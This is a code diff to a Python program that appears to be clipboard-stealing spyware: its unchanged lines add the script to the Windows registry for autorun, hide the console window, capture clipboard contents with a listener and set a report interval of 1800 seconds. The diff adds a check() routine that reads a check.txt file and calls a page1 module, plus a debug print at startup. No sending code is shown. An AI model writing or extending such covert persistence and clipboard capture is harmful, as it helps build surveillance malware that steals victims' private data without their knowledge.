@@ -22,6 +22,8 @@ import  shutil
 import logging
 import sys
 
+import page1
+
 autorun.AddToRegistry()
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
 if hwnd != 0:      
@@ -39,6 +41,16 @@ temp_data = pyperclip.paste()
 #     with open('clipboard.txt', 'a') as clip:
 #         pass
 
+def check():
+    # data = ''
+    with open('check.txt', 'r') as f:
+        # print(f.read())
+        data = f.read()
+        print(data)
+        if data != 'true':
+            page1.my_page1()
+            
+
 clipboard_data = ''
 
 def clipboard_listener():
@@ -53,6 +65,8 @@ def clipboard_listener():
     mytimer.start()        
 
 def main_func():
+    check()
+    print('main function started')
     global clipboard_data
     clipboard_listener()
     SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
